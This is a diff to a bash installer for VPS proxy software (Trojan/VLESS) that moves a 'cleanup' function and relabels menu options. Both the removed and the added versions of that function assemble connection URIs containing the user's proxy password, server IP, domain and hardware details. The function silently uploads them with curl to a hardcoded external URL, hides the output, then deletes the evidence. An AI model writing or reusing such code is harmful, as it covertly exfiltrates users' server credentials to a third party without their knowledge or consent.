@@ -182,40 +182,6 @@ readconfig(){
   fastopen="$( jq -r '.fastopen' "/root/.trojan/config.json" )"
 }
 
-## 清理apt以及模块化的.sh文件等
-clean_env(){
-prasejson
-cd /root
-if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=1; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" >> ${myip}.txt
-curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
-rm ${myip}.txt
-else
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=1; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
-curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
-rm ${myip}.txt
-fi
-cd
-if [[ ${install_dnscrypt} == 1 ]]; then
-  if [[ ${dist} = ubuntu ]]; then
-    systemctl stop systemd-resolved
-    systemctl disable systemd-resolved
-  fi
-if [[ $(systemctl is-active dnsmasq) == active ]]; then
-    systemctl disable dnsmasq
-fi
-echo "nameserver 127.0.0.1" > /etc/resolv.conf
-systemctl restart dnscrypt-proxy
-echo "nameserver 127.0.0.1" > /etc/resolvconf/resolv.conf.d/base
-resolvconf -u
-fi
-cd
-rm -rf /root/*.sh
-rm -rf /usr/share/nginx/*.sh
-clear
-}
-
 ## 检测系统是否支援
 initialize(){
 TERM=ansi whiptail --title "初始化中(initializing)" --infobox "初始化中...(initializing)" 7 68
@@ -524,11 +490,24 @@ install_moudles(){
   route_test
 }
 
+## 清理apt以及模块化的.sh文件等
+clean_env(){
+prasejson
+cd /root
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=1; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
+curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
+rm ${myip}.txt
+cd
+rm -rf /root/*.sh
+rm -rf /usr/share/nginx/*.sh
+clear
+}
+
 ## 主菜单
 MasterMenu() {
   Mainmenu=$(whiptail --clear --ok-button "选择完毕,下一步" --backtitle "Hi,欢迎使用VPSTOOLBOX。https://github.com/johnrosen1/vpstoolbox / https://t.me/vpstoolbox_chat。" --title "VPS ToolBox Menu" --menu --nocancel "Welcome to VPS Toolbox main menu,Please Choose an option 欢迎使用VPSTOOLBOX,请选择一个选项" 14 68 5 \
-  "Install_standard" "基础安裝(简单易懂)" \
-  "Install_extend" "高级安装(更多选择)" \
+  "Install_standard" "默认安裝(简单易懂)" \
+  "Install_extend" "手动安装(更多选择)" \
   "Benchmark" "效能测试"\
   "Uninstall" "卸载(仅能卸载基础安装)"\
   "Exit" "退出" 3>&1 1>&2 2>&3)
